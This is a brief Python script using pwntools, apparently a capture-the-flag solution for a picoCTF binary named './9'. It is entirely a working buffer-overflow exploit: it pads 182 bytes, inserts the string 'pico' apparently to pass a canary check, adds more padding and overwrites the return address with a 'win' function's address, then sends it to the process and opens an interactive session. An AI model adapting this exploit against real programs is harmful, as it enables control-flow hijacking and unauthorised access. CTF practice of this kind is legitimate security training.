from pwn import *

r = process('./9')

offset = 182
win = 0x8049316
payload =  b'A' * offset + b'pico' + b'A' * 16 + p32(win)
r.sendline(str(len(payload)))
r.sendline(payload)
r.interactive()